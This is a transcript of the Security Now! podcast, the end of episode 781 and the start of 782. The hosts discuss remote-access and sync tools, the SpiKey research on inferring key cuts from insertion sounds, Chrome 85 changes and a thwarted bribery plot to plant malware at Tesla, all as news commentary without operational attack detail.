There's an MSI Configurator to create custom Host installers for unattended access or to customize the remote Agent module where you could put your own company logo and welcome text for attended support.  It supports Power Control Mode, allowing you to remotely restart a PC, either in normal or safe mode, shut it down, lock it, put it to sleep.  Active Directory support, you can fetch an Active Directory tree, add new domain controllers, and access Active Directory workstations and servers with one click.  It's got two-factor authentication, time-based token, for access to specific or every remote host.  I mean, it just goes on and on.



All the connections are TLS 1.2 that cannot be turned off.  Encryption is always on.  You can encrypt your address book in case the viewer's workstation was ever compromised to keep a bad guy from using that to get into the remote systems that you have access to.  Host identity is certificate-based to ensure that you are connecting to the same host that you intend to and not some sort of spoof.  You can deploy it in a totally isolated environment over a LAN where you have direct connection, or over the public Internet, which is how, for example, Lorrie and I use it.  Blank passwords are not allowed.  There are no default passwords, either.



I mean, these guys clearly understand security.  They did everything right.  It's got built-in protection against brute force cracking.  When an excessive number of incorrect password attempts is seen, the system automatically begins increasing the amount of time required and will lock out an IP that is failing at multiple requests.  And of course there is no ability to brute force because most systems are behind NAT so there's no open ports, either.  Anyway, it goes on and on.  It's just called Remote Utilities.  I am in love with it, and I wanted to make sure our listeners knew about it.



The other thing I wanted to make sure that I sort of reminded people of.  I'm still in love with Sync.com.  But it's limited to synchronizing a single folder tree among two or more Windows devices.  It's perfect for what it does.  I'm using it.  I'm loving it.  For that it's great.  But in another aspect of what we needed for Lorrie's deployment, we wanted a little directory tree that's underneath each of these neurofeedback apps that are out in each of these deployed laptops, and there's 20 of them out at the moment.  We wanted a little snippet of a directory tree to get synchronized back to the Drobo that we have in our location.



And Syncthing, again, I've mentioned it before.  I wanted just to remind people of it.  I was asked by somebody in Twitter who had a couple of QNAP servers how he and his buddy could synchronize them to back each other's stuff up.  And I was reminded of Syncthing, which just does that perfectly, that you can run Syncthing on QNAP.  I'm running it on my Drobos.  It runs on Mac and Windows and Linux, FreeBSD, Solaris, and OpenBSD.  It's open everything.  Protocol, open source, open committee, I mean, it's a great tool.  And it supports a far more flexible, like you can get yourself lost, you can create something so complex.



So I have all of the machines that are out there synchronizing a snippet of their directory structure back to a compound directory structure on the Drobo which Lorrie is able to see.  Some of the folders are one-way synchronizing so that, for example, logs that are external synchronize back to us.  Some of them are one way in the other direction so that, if Lorrie drops a media file that she wants to go out to everybody, she just drops it in the media folder on the Drobo, and the next time everybody connects, they get updated automatically.  And then some things are bidirectional synchronized so that the most current copy is synchronized.



Anyway, Syncthing.net is that.  And there's an investment you need because it's kind of funky the way it works.  It took a while for me to - I was going "Huh?" for a while.  But once you understand the way it works, there's just nothing it can't do in terms of options and features and the complexity that you're able to maintain.  And again, it's all NAT-penetrating.  You can open a port if you want.  You can allow it to use UPnP if you want.  Or you can allow it to use external relay servers, and it'll do that, as well.



LEO:  As you can see, I've been a very happy user for the last five or six months.



STEVE:  I didn't know that.  Very, very cool.



LEO:  Oh, yeah.  I love Syncthing because you don't need a third-party cloud storage.  If you have enough devices...



STEVE:  Exactly.



LEO:  ...just sync them all.  In fact, after you mentioned Sync.com, I kind of was looking for other things.  I tried other third-party stuff.  Then I found Syncthing.  I said, oh, that's exactly what Steve needs.  I've been meaning to mention this to you for some time now.  But it's really great.  All my systems are on it, which is nice if you have multiple systems because then it keeps stuff in sync.  I just did a hands-on Macintosh piece on it this past Saturday, ironically.



STEVE:  Ah, very cool.



LEO:  So, you know, I've been meaning to ask you because I really like this idea that each device has its unique identifier, plus each folder has its unique identifier.  And even though I just showed both of those, it's secure because if you entered into your Syncthing, oh, well, I want to join Leo's W6MUCOA9UF folder, I'd still have to give you permission to do it.  So it's secure in that regard.



STEVE:  Correct.  What happens is, if somebody were to grab that and drop it into their Syncthing and try to create a connection, a request on your end would pop up saying, hey, somebody got your ID.  Do you want to allow it?  But that's also the cool thing is that...



LEO:  You can share with anybody, yes, yeah.



STEVE:  ...you could easily create a directory and share it with a friend.  They use that, and then you link those two things together.  It's just, I mean, they just nailed it.



LEO:  It reminds me of our old friend BitTorrent Sync except it's done right.  It's really - I think it's just exactly.  And it's open source, so we don't have to guess what the protocols are.



STEVE:  It's open source.  Everything is certificate-based.  That's basically a large fingerprint of the certificate that uniquely identifies that machine.  And you're able to do things like say, if a new subfolder appears, or if a machine I'm connected to creates a new folder, I want to automatically grab it and start syncing it, or I don't.  And, I mean, it just...



LEO:  Oh, on and on.



STEVE:  Again, there are so many features that you can get yourself a little tangled up.  But for a power user, they nailed it.  And massively cross-platform.  It runs on everything.



LEO:  That's why I use it.  It's on my Linux machines.  It's a daemon that runs in the background on all of my machines - Linux, Mac, and Windows.  I love the file versioning.  You have lots of choices of file versioning.  And I often will do it "send only" so I don't have to worry about syncing deletions.  If you make it "send only," then that's basically a backup.  Everything you change here will be synchronized, but nobody else's changes will be synchronized.  So, you know, it does take a little time to kind of figure it all out.  But I'm supremely impressed with it.  I'm glad you agree.  I've been meaning to ask you about it.  Good, good, good, good.  And it's free.



STEVE:  Yes, and free, exactly.



LEO:  Free.



STEVE:  Thank you very much, world.



LEO:  World.



STEVE:  So over the weekend, using DigiCert's entirely automated self-service system, I rekeyed all of GRC's certificates ahead of the next Tuesday, September 1st deadline, after which certs can only have a 397-day life, rather than twice that.  And among those that I rekeyed was GRC's revoked.grc.com cert, which I mentioned last week had expired so that it was being dishonored due to expiration rather than revocation.  And for those listeners who had been using the service, and I learned that there were, what is it, 580-some a day are going to the revoked.grc.com page, that system is up and running again.  So I bought myself an extra year before I need to do all of that again.



But I also realized a benefit of having the expiration date of all of my certs now synchronized.  If we're going to be needing to do this annually, as I will starting two years from now because from now on certificates are going to be expiring annually, doing that certificate renewal work in a single batch will at least be much more convenient than the interrupted multiple times per year.



LEO:  You have a new holiday on your calendar, Cert Renewal Day, and you just do it every year, yeah.



STEVE:  Now, of course, it is the case that it's only necessary because I'm using OV certs, you know, Organization Validation, as a class above the DV certs, the Domain Validation, which can be, and I recognize this, fully automated.  And a lot of people are just going to say, okay, Gibson, I don't care, I'm just going to use the ACME protocol with Let's Encrypt and let my server keep itself updated.  And I get it.  Maybe someday that'll happen.  But for now, DigiCert has made this so simple for me that it's something I enjoy, and all my certs are now synchronized.  And I just wanted to mention that revoked.grc.com is back up and running again.



Oh, and one last bit.  I meant to mention last week, Leo, and I know you'll appreciate this, that as a result of all the benchmarking R&D we've done, we have learned a great deal about SSDs operating in the real world - Samsung, Kingston, OCZ-Vertex, Crucial, and others.  And what has surprised us all is the non-uniformity that many of them show in their operation.  It's not what anyone would expect from something with the seeming purity of solid-state memory.  Their operation was kind of all over the map and varied widely at the five different points where we are benchmarking them.



The thing I meant to note was that one single brand stood out from all others.  Samsung was by far the most rock solid.  And every one of those that we saw, and there were many of them represented in the population that have been looked at so far, they all followed the governing specifications to the letter, which many did not.  But also the performance was just solid.



LEO:  Yeah.  There's my favorite, the EVOs, yeah.  Really love those, yeah.



STEVE:  I just wanted to say that I'm sure that the gang who are working with me in the spinrite.dev group all will see their future purchases biased, all other things being equal, toward Samsung because we all were going, wow.  Because, I mean, we're all sharing all of our results.  And it's like, whoa, okay.  So we already know that smartphone cameras now have sufficient resolution, and our software's become sufficiently clever, that a photo of a traditional house key at a distance can be used to reconstruct a working physical key.  And we also know that the vibrations of objects in a distant room - we've talked about balloons, a bag of potato chips, a light bulb, or even the leaves of a plant - can be observed optically by laser or similar technology at a distance to reconstruct the acoustic waves those objects are being subjected to, to eavesdrop on conversations occurring in that room.



And now, with the publication of some intriguing new research, another piece of our traditional perception and assumption of security has just fallen to the wayside.  The research paper, which documents the detailed and painstaking work by three quite enterprising students in the Department of Computer Science at the National University of Singapore, bears the title "Listen to Your Key:  Towards Acoustics-based Physical Key Inference."



LEO:  Oh, oh, oh, no, no, no.  No.  Oh, my goodness.



STEVE:  Yes.



LEO:  Okay.



STEVE:  The abstract of the paper reads:  "Physical locks are one of the most prevalent mechanisms for securing objects such as doors.  While many of these locks are vulnerable to lock picking, they are still widely used as lock picking requires specific training with tailored instruments, and easily raises suspicion.  In this paper we propose SpiKey, a novel attack that significantly lowers the bar for an attacker, as opposed to the lock-picking attack, by requiring only the use of a smartphone microphone to infer the shape of the victim's key, namely bittings, or cut depths, which form the secret of a key.



When a victim inserts his or her key into the lock, the emitted sound is captured by the attacker's microphone.  SpiKey leverages the time difference between audible clicks to ultimately infer the bitting information, i.e., the shape of the physical key.  As a proof of concept we provide a simulation, based on real-world recordings, and demonstrate a significant reduction in search space from a pool of more than 330,000 keys to three candidate keys for the most frequent case."



So in other words, yes, Leo, these researchers have shown that just capturing the sound of a traditional physical key being slid into its lock is all that's needed to recreate that key with a high level of confidence.  A nearby smartphone or even the house's nearby smart doorbell microphone provides audio which is sufficiently accurate to provide the clues.  We all know how a traditional physical lock and key work; right?  Inside the lock are a series of six spring-loaded pins which are each split at a different location along their length.  When the proper key is inserted into the lock, the ridges on the key pushing against those internal springs positions each of the pins such that the splits in the pins line up with the edge of the lock's cylinder.  Thus no pin prevents the cylinder from then freely rotating in the lock.



And I suppose because I'm a bit odd, throughout my lifetime I've often stopped to appreciate the sheer beauty of that simple invention.  It requires no power.  It is durable and largely weatherproof except in the face of extreme freezing.  And it's extremely reliable, so much so that its failure is vanishingly infrequent.  And when it does eventually fail, typically after decades of reliable use and wear, it does so in a fail-soft fashion only after providing ample clues that its need for servicing is becoming acute, such that "jiggling the key in the lock" is a longstanding meme.  But mostly it achieves all this in an example of a brilliant tradeoff.  We get all of that in return for accepting that it's not perfect protection.



Is it cryptographically secure?  Of course not.  Can it be picked and defeated by anyone skilled in the art with a few simple lock-picking tools?  Yup.  Are there sufficient combinations that no one else's key will open it?  No.  A famous hack is just to try locks with keys they don't belong to.  Sometimes you just get lucky, specifically because the universe of all possible combinations is comparatively small.  But the likelihood of any random key working in any random lock is low enough that no one bothers to try.



But it's exactly that comparatively small universe of possibilities that allows this research to succeed.  Once the audio of a key insertion has been obtained, SpiKey's inference software gets to work filtering the signal to extract the comparatively strong metallic clicks as the key's ridges hit the lock's pins.  The click occurs when one of the spring-loaded pins crosses over the top of any of the key's ridges.  I have a picture, a photo, a diagram from their PDF, which shows the instance of the click occurring on the six pins.  They explain, as I just did, how the lock works mechanically, and then the event of the click.



And I actually made - they have a photogram of the audio, which plays from Google, which you can hear.  And Leo, you should probably put this into the podcast.  It's GRC's Shortcut of the Week, so it's grc.sc/781.  And there it is.



LEO:  And of course we've all heard this.  But you don't pay any attention to it; right? 



STEVE:  Exactly.



LEO:  And it doesn't sound this clear.  But I guess modern phone microphones are good enough, they can pick it up.



STEVE:  Yes.  So basically they say, well, so these clicks...



LEO:  So the grooves on the side don't do diddly.



STEVE:  No, correct.



LEO:  It's just the teeth.



STEVE:  Right.



LEO:  The bittings.



STEVE:  Well, now, okay.  So the grooves in the side do create classes of keys which will work in the lock.



LEO:  Ah, right.



STEVE:  And those do differ among brands and within brands.  So that does create subsets.



LEO:  Right.  But you can easily - there probably aren't that many sets, I would guess.



STEVE:  Exactly.  There are not.  And so for example many times your key won't even go in.  And then, if it does, then it will go in, but it won't turn.



LEO:  Right.



STEVE:  So anyway, the clicks drive the inference analysis.  It's the time between the clicks which allows the SpiKey software, which they developed, to compute the key's inter-ridge distances.  And what locksmiths refer to as the bitting depth of those ridges, which is how deeply they cut down into the key shaft and where they plateau out.  If a key were to be inserted at a non-constant speed, the analysis would be defeated, though the software can compensate for small insertion speed variations.  So, but if you were, like, if this freaked you out, and you were at high risk, you felt, then you could simply start inserting your key at a non-constant pace, and you would defeat this.



But given all the available acoustic information, complete disambiguity cannot be obtained.  So they end up with multiple possible keyings in the best case.  And this is why the paper's abstract noted that the SpiKey software will output the three most likely key designs to fit the lock that was used in the audio provided by that file, which does reduce the potential search space, as they said, from 330,000, which is the universe of possible combinations, down to just three.



They said:  "When a victim inserts a key into the door lock, an attacker walking by records the sound with a smartphone microphone.  SpiKey detects the timing of these clicks from the sound.  We then utilize the click timestamps to compute the adjacent inter-ridge distances given a constant insertion speed.  We use the computed distances to infer the relative differences of adjacent bitting depths, which SpiKey exploits to ultimately obtain a small subset of candidate keys that includes the victim's key code."



They said:  "We detect all click events from the audio recording."  They do subject it to a high-pass filter to reduce the impact of low-frequency ambient noise, retaining only frequencies above 15kHz that contains the information, the acoustic information about the clicks.  And they said:  "Subsequently, we identify the starting point of each click, or its onset, in the pre-processed signal by applying change-point detection algorithm on short time windows around the computed peaks to account for their millisecond granularity."



They said:  "It finds the least sum of standard deviations across two regions that transition from low to high amplitude."  That is, in terms of the amplitude of the click sound.  So they did some serious acoustic processing to just absolutely nail down the time event of the click.  For anyone who's interested, I've got the PDF link to their research in the paper.  It goes on to explain exactly how they convert the click onset timings into a few possible candidate keyings.  So anyway, I just thought, you know, one more longstanding time-honored piece of real-world technology has just fallen.



LEO:  It's terrible.



STEVE:  We can no longer insert our key into a lock without the possibility of somebody simply eavesdropping.  And you can imagine, Leo, if you had a telephoto microphone at a distance, aimed at that lock, and somebody were to insert the key, it would be able to pick it up at a distance with a big parabolic mic and capture the sound.  And that would be enough.



LEO:  Isn't that amazing.



STEVE:  Isn't that cool.



LEO:  Just amazing.  How doable do you think that is?  I mean, I know it's theoretically, of course, but...



STEVE:  I mean, they did it.  They recorded it.



LEO:  And they were able to make the key.



STEVE:  They wrote the software, and it designed three keys, and one of those three opened the lock.



LEO:  Wow.  Isn't that great.  I think I just - you've got to admire the ingenuity and the cleverness involved, whether this is a - I can see a big three-letter agency using this.  They should write this into the next Jason Bourne script or something.  I think that'd be...



STEVE:  So it would be useful in a situation where you would be observed picking a lock.  Certainly a three-letter agency would have people who can pick a lock.



LEO:  Get right in.



STEVE:  I can pick a lock.  You can pick a lock.  You know, techies know how to do that.  It's just, you know, it's not that difficult.  But during the process you're observable.  So if you had a scenario where someone posing as a cable TV serviceman or maybe the house cleaner needed to just be able to walk up, quickly insert the key, and enter, you'd want to be prepped ahead of time.  And so this would allow you to produce one of three keys where they could look like they were fumbling for the right key among their key ring, but in fact they were trying the subset of possibilities and then say, oh, yeah, there it is, and then they waltz right in with everybody else standing around watching them.



LEO:  Wow, that's wild.  Steve, you've done it again, always do.  It's fascinating stuff, and that's why we listen each and every Tuesday to Security Now!.  You can get Steve's famous SpinRite, the world's best hard drive maintenance and recovery utility at his website, GRC.com.  Version 6 is out; 6.1 is on its way.  Buy 6 today, you'll get 6.1 for free, and you could participate in the building of 6.1, which is moving apace.  That's all at GRC.com.



You'll also find the show there.  He's got 16Kb and 64Kb versions of the show, the audio.  And he's got transcriptions, which are very handy if you like to read along while you listen.  He also has lots of other free stuff there.  So check it out, GRC.com.  You can leave feedback there, GRC.com/feedback.  Or leave it for him on Twitter.  Steve is, yes, a Twitter user, and his Twitter handle is @SGgrc.  Do you respond to people though, as much as just, if people leave you a message, you get it?



STEVE:  I do when I can.  But frankly, there's, I mean, it's just...



LEO:  That would be overwhelming, yeah.



STEVE:  It is, yeah.  I figure people would rather I got SpinRite 6.1 done than spend a day responding to private tweets.  So I try to read them, yeah.



LEO:  You don't have to explain to me.  I get a lot of email every day.  And it breaks my heart because it's always, for me, it's people who listen to The Tech Guy and who have fairly basic questions, and they're suffering, and they can't find help.  But if I answered that email I wouldn't be able to do anything else.  So it's all we can do.  We do what we do as best we can.  Of course what you should do is just come back here every Tuesday, round about 1:30 Pacific, that's 4:30 Eastern, that's 20:30 UTC.  That's when we record the show.



You can watch us do it live at TWiT.tv/live.  There's audio and video there.  If you're doing that, chat with us.  The chatroom is irc.twit.tv.  You can also get on-demand versions of the show, not just at Steve's site, but at our site, in this case TWiT.tv/sn.  Of course it's on YouTube, and you can always subscribe.  Get your favorite podcast app and subscribe to Security Now! because you don't want to miss an episode.  You want the complete set.  Collect all 999.  Eventually that's the number.  This is Episode 781.  And I thank you, Steve.  Have a great week, and we'll see you next week.



STEVE:  Thank you, my friend.  Right-o, bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#782

DATE:		September 1, 2020

TITLE:		I Know What You Did Last Summer

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-782.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we take some deeper dives into fewer topics.  We look at a bunch of the new features offered by Chrome's latest update.  We look into the fascinating details of a Russian attempt to co-opt and bribe an employee of Tesla, and at some sobering security research which successfully circumvents Visa's point-of-sale PIN protection, allowing purchases of any amount.  We also have a bunch of closing-the-loop feedback and miscellany.  Then we examine the surprising research into just how well knowing where our browser has gone in the past identifies who we are today.  Knowing what someone did last summer tells us who they are with surprising accuracy.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We go on a deep dive in the new Chrome 85.  We'll talk about problems with the credit card standard EMV.  And then Steve's going to talk about a fingerprint technology that doesn't use cookies and is much more accurate.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 782, recorded Tuesday, September 1st, 2020:  I Know What You Did Last Summer.



It's time for Security Now!, the show where we cover your security, your privacy, your safety online with this guy right here, the man in charge, Mr. Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.



LEO:  Good to see you.



STEVE:  Great to be with you for this first day of September.  Where has - well, I know where the year went.  It's been quite a year.



LEO:  I hope it goes a little faster.  Let's move it right out.  No need to delay. 



STEVE:  Yeah, I would like to be in my time machine and jump these next two months up to the beginning of November.



LEO:  I wouldn't mind jumping two years at this point.



STEVE:  But we've got to move through September and October first.



LEO:  Yeah, yeah.



STEVE:  I wasn't sure when I titled this show, the title just popped into my head when I realized that the fun thing to talk about would be some updated research which was originally conducted, the first round, eight years ago in 2012, about the degree to which an analysis of our browser's history, just a static analysis of our browser's history can disambiguate users from each other.  That is, where we've gone tells anyone looking who we are.  So of course "I Know What You Did Last Summer" is the name of this podcast this week.  And we're going to take some deeper dives into fewer topics this week.  Sometimes we just quickly cover a bunch of stuff.  I wanted to look at a bunch of the new features offered in Chrome's latest update...



LEO:  Oh, good.



STEVE:  ...that we talked about last Tuesday, Chrome 85, just as it was coming out.  And oddly enough, I had to go into About Chrome last night on a system where I've been using Chrome off and on since the last week, but it still hadn't kicked into its auto update for whatever reason.  We're also going to take a look into the fascinating details of a recent, as in last week, culminating last week, but pretty much through the month of August, attempt by Russian-sourced individuals to co-opt and bribe an employee of Tesla.  The details are interesting.  Also some sobering security research which successful circumvents Visa's point-of-sale PIN protection, allowing purchases of any amount with a stolen Visa card and just completely bypassing the need for a PIN.



LEO:  Wow.



STEVE:  Also we have a bunch of closing-the-loop feedback with our listeners, some of which is really neat, and some miscellany.  And then we're going to, as I said, examine this - oh, not only was there research from eight years ago, but it was just updated by a trio of researchers at Mozilla a week ago.  So a bunch of neat stuff to talk about.  And we also update our Picture of the Week, which was humorous, and which we showed earlier this year, like I don't remember, like maybe late March or April.  It showed a timeline of the way the COVID-19 pandemic had changed the importance of things, like a sudden jump in toilet paper and a gradual increase in the use of the Internet.  A pretty straight line need for coffee, but alcohol consumption increased.  Anyway, that picture has been updated kind of wonderfully.



LEO:  Oh, yeah, that is one more item to really put it over the top.



STEVE:  It just, every time I look at it, Leo, it just cracks me up.  It so perfectly does.



LEO:  It's really - it's our life.  Well, we know what you did last summer, and we know what we did last summer.  We were here, busy.  And boy, the security landscape didn't change things much.  I'm going to have to make some room on the screen for this one.



STEVE:  So people are going to have to check out the show notes if they're curious to see this.  Suffice to say this thing tracks from March through June, the "Relative Importance in 2020 So Far" was the title, of coffee, of your car, of the Internet, of shaving, of alcohol, of toilet paper,



  and of sweatpants.  And remember the need to shave dropped down because you didn't have to be going to work every day.  There was this weird toilet paper shortage when suddenly everybody was going to be staying home and worried about how long they were going to be there, and so people over-purchased toilet paper, thus creating sort of a synthetic shortage of it for a while.



Of course Internet grew in importance.  Cars dropped importance dramatically because people were not commuting.  Sweatpants increased in importance because you didn't have to get dressed.  And after all, no one can see you from the waist down when you're using a Zoom conference.  You're like, no, I've got my pants on, yeah, uh-huh.



Anyway, the point is that a last item was added which was the relative importance of masks.  And what's so funny about this is that it looks like the walk of a drunken ant on the paper.  It's sort of up and down and goes around in circles a bit, and it does a peace symbol at some point, you know, it's just wonderful.  So anyway, I thank a Twitter follower of mine for sending that to me because, yes, I'm sure he remembered that we showed the original chart, which was fun also.  But this is just kind of hysterical.  So thank you.



Last week we talked about Chrome 85's release that day which would, among other things, fix a worrisome remote code exploit which existed in Chrome's WebGL rendering engine.  But I said "among other things," so I wanted to take a couple of minutes to enumerate the other major changes that landed last week in 85.  In this day of massively heavy web pages, as we know, speed is paramount.  And as we've spoken of many times, Google has really focused, to their credit and to the Internet's benefit, on measures to increase the user's perceived browser speed just across the board, going so far as to pioneer new Internet communications standards like the QUIC protocol to enhance connection performance and the operation after a connection has been made.  So big props and hats off to Google.



[Chrome] 85, which we've had now for a week, introduces a new compiler optimization technique known as PGO, standing for Profile Guided Optimization.  It, in independent page-loading benchmarks, has shown a measurable and significant improvement in the browser's overall performance, that is Profile Guided Optimization.  Chrome's Engineering Director Max Christoff said:  "Because PGO uses real usage scenarios that match the workflows of Chrome users around the world, the most common tasks get prioritized and made faster."  He added:  "Our testing consistently shows pages loading up to 10% faster at the median, and even greater speed improvements when your CPU is tasked with running many tabs or programs."



So essentially PGO makes it possible for the browser's most performance-critical code to run faster.  You know how browsers now have JIT, just-in-time compilers.  Well, they're "just in time" meaning that uncompiled code is compiled as it's needed.  But it turns out that, if you take a little more time to better optimize that code which is being compiled on the fly, the result, not surprisingly, is a much better page experience.  And so essentially they're no longer treating all just-in-time compiled code equally.  They are using some compile time heuristics and some history of it in order to understand that it makes sense to take more time to better optimize this code which is being compiled just in time on the fly.  So this ends up producing some great results.



There are two benchmarks which are often used.  One is known as the "First Contentful Paint," which is the interval between the start of a page load and the browser's first display of any of the page's content.  So of course that goes a long way toward describing the user's perception of how long they're waiting for the page.  It's like, oh, good, here comes the page.  Stuff is beginning to show.  It measured a browser improvement of up to 3.5%, and there's something known as the speed meter browser benchmark, which clocked an 11.4 improvement, as well as an overall 7.3% improvement in the browser's responsiveness.  So we just got that for free.  And presumably, eventually, all Chrome instances, that is, all the other browsers that are Chromium-based will get that, as well.



And there's also an interesting new emerging new lossy image compression format known as AVIF.  It is able to outperform WebP, JPEG, PNG, and GIF, and is intended to eventually replace them all.  I loved this graphic of the AVIF imagine format support.  This is something that anyone who tracks which features which browsers have will be used to seeing.



Among all of the different browsers - IE, Edge, Firefox, Chrome, Safari, Opera, iOS Safari, Opera Mini, and Android - and showing a stack of their various versions, there is exactly one green rectangle, which is Chrome 85.  In other words, Chrome as of - actually it was as of, yeah, it was as of a week ago, now is the first browser and the only browser at the moment to offer support for this AVIF format.  But again, as other browsers update their Chromium instances, we can expect more widespread support shortly.



This AVIF is AV1 Image File Format, which compresses using the AV1 codec and has been found to dramatically reduce image sizes without a significant loss of quality.  So it's what you want.  It's fewer bits describing a picture with equal crispness.  In tests that were conducted by Netflix using AVIF images, they found that AVIF significantly reduces a file size while retaining high-level image detail.  And not surprisingly, image size matters to Google because of course big images are going to take longer to load.



Google wrote:  "Reduce bandwidth consumption to load pages faster and reduce overall data consumption."  They said:  "AVIF offers significant file size reduction for images compared with JPEG or WebP.  Prior to full optimization, Netflix published results on their test, showing 50% savings versus JPEG across use cases, and going past 60% for images that were RGB."  So anyway, it's compatible with high dynamic range images, and sites such as Netflix, YouTube, and Facebook have shown an interest in its use.  So not surprisingly, Google decided to build in support for the file format; and I expect we'll see others, even non-Chromium browsers, following suit before long.  For anyone who's interested in learning more about this, there's a link in the show notes, I put a link in to the Libre software site which has some very good background about it.



Over on the security side, about a year and a half ago, back in April of 2019, as part of their overall pro-HTTPS march, Google signaled that they would be tightening up their alerts and blocking of mixed content downloads.  As we know, mixed content refers to any page asset which is fetched over, these days, HTTP from a base page that was fetched over HTTPS.  For a long time, only so-called "active" mixed content was being blocked, and passive content such as images and MP4s and things, that is, for example, not an iframe, not JavaScript, certainly.  Those are very active.



But passive things were perceived as being lots less worrisome and could just be allowed without comment.  This was also likely a consequence of the fact that many sites were still continuing to pull some resources over HTTP.  I'm sure that Google's Analytics demonstrated that, if 18 months ago they started just putting their foot down about HTTP loading of passive content, it would break a lot of things.  So today, or last week, with the release of 85, Chrome has started displaying a visual warning whenever mixed content audio, video, or images such as PNG, GIF, JPEG, and even MP4 videos are downloaded.  Chrome is also now blocking other mixed content files that are considered unsafe because they could be abused to deliver malware, such as PDFs, DOCs, DOCX, and XLS and their like.



So assuming that this move last week doesn't result in some sort of a surprising end of the world as we know it, where many more things are being blocked and causing problems, the next Chrome, 86, is expected to block across the board all mixed content downloads, period, making no discrimination about what their nature is.  So this is, essentially, this is Google saying, okay, we know that it was a pain to switch to HTTPS.  But pretty much everybody is now.  And boy, I'll tell you, anytime I do something that is not HTTPS, it's increasingly difficult.  Like, you know, for example, Leo, you and I were talking about Syncthing.  Well, if you're just talking to a web browser on your LAN that you're looking at across the room, there's arguably very little need to connect to it securely.



LEO:  Right.



STEVE:  But, boy, does it complain, Chrome, if you try to talk to an HTTP thing.  Or the same for our routers.  Our routers are right here.  Some of them have self-signed certs, but generally it's like, yeah, it's just 192.168.1.1 or something.  And you could argue there's no point in it being HTTPS.  But again, our browser's like, oh, I don't know.  You might be up to no good here.  It's like, oh, okay, fine.  So anyway, the point is I'm sure that Google would say at this point it's past time that any resources on the 'Net should need to be HTTP.  So we're just going to put our foot down because the only way this is going to get fixed, if we say no.  And then if those end up being important, they'll be moved over to HTTPS.  So we're sort of at that point right now where it's like, this is it.



In a couple other, or one other - one or two?  Oh, yeah, two other features.  Chrome 85 also allows you to create shortcuts for progressive web apps so that users will be able to quickly access commonly used tasks for which they use progressive web apps.  You can hold your mouse over the PWA icon or right-click it, and you'll get a list of those that are enabled.



And also, back on the security and privacy side, we've talked often through the years about abuse of the user-agent header.  Whenever our browser is making a query, one of the metadata tags in that query identifies a lot of features about the browser.  And like so many features that were designed in the beginning as an aid to the web's operation, like cookies, for example, as an example of another one, the user agent string has been abused for tracking web browser users.  It's an information-laden, relatively static thing that unfortunately has a lot of unique information.



The cool idea, and the reason it was originally created, was that the browser itself and its various add-ons could add their own designations and their version numbers to that string so that web servers receiving a query might become version number aware, and thereby able to perhaps work around known problems or lacks of features with specific versions, or probably back in the early days with specific browsers.  It was like, oh, well, you know, this browser doesn't support this.  So they would serve up a slightly different page, depending upon the profile of who was doing the asking.



Anyway, as I said, as a consequence of this, there's like some weird attributes that user agent strings have acquired over the years, like claiming that they are who they're not in order for them to receive content that they actually do know how to render.



So to combat this problem, Google had originally planned to enable the addition of a new feature called User-Agent Client Hints into last Tuesday's Chrome 85.  But in another concession to the coronavirus, Google decided to drop this back into 2021, I think April, if I recall right.  But, you know, next year.  When it does happen, it will by default simplify the user-agent string so that it becomes much less juicy as another tracking signal.  It is in Chrome 84, that is, previous to 85.  It's just not enabled yet.  But it can be switched on.



If you were to go to chrome://flags/#freeze-user-agent, that flag you can turn on which will essentially remove a lot of the extraneous information used for tracking today.  So you can try it and see how it goes.  Again, it's expected to be the default.  And so at some point I'm sure Google will start experimenting to make sure that it doesn't break things that are mission critical.



In almost a, well, state-sponsored spy story, we have something that really happened.  And I can tease this by quoting our friend Marcus Hutchins's Twitter reaction upon learning of it.  Just to remind everyone, Marcus is the well-known security researcher and reformed cybercrime hacker.  He actually reformed in his teenage years, but the FBI didn't forgive him for that.  And of course, as we know, his future became uncertain when the FBI grabbed him in Las Vegas's McCarran Airport as he was departing or preparing to depart from the U.S. for his home in the U.K. following the annual Black Hat and Defcon conferences.



Well, last Thursday, reacting on Twitter to the news of this story which had just broken, Marcus quite correctly observed, he tweeted:  "One of the benefits of cybercrime is criminals don't have to expose themselves to unnecessary risk by conducting business in person.  Flying into U.S. jurisdiction to have malware manually installed on a company's network is absolutely insane."



Okay.  So what was all that about?  A 27-year-old Russian national by the name of Egor Igorevich Kriuchkov traveled to the U.S. and attempted to subvert and bribe an employee working at Tesla Corporation's massive Nevada-based Gigafactory.  Egor ultimately agreed to pay the employee one million dollars to plant malware inside Tesla's internal network.  The good news is the employee reported the offer to his employer, Tesla, and then worked with the FBI to build an airtight case and to set up a sting which included having him covertly record face-to-face meetings discussing this 27-year-old Russian's proposal.



In their complaint, which followed Egor's arrest and arraignment last Tuesday, the prosecutors wrote:  "The purpose of the conspiracy was to recruit an employee of a company to surreptitiously transmit malware provided by the co-conspirators into the company's computer system, exfiltrate data from the company's network, and threaten to disclose the data online unless the company paid the co-conspirators' ransom demand."



The complaint said that the malware would be custom developed to propagate through the company's network.  For it to work, the group said it needed the employee to provide information about the employer's network authorizations and network procedures.  Kriuchkov said the malware would be transmitted either by inserting a USB drive into a company computer or clicking on an email attachment containing malware.  Egor explained that the infecting computer would have to run continuously for six to eight hours for the malware to move fully through the network.  To distract network personnel, a first stage of the malware would perform a denial of service attack, while a second stage performed the data exfiltration.



When the complaint was initially unsealed last Tuesday, the identities of all parties was still confidential, being identified only as "Company A" and "CHS1," which is their abbreviation for Confidential Human Source #1, that is, the employee.  But last Thursday Elon Musk confirmed that, yes indeed, it was his company that was the target of this whole operation.  The charging document, which was filed in federal court in Nevada, detailed an extensive and determined attempt to infect Tesla's network.  The defendant, again, 27-year-old Egor Igorevich Kriuchkov, allegedly traveled from Russia to Nevada and then met with the unnamed employee on multiple occasions.  When Kriuchkov's initial $500,000 bid failed to clinch the deal, the defendant doubled the offer to $1 million.



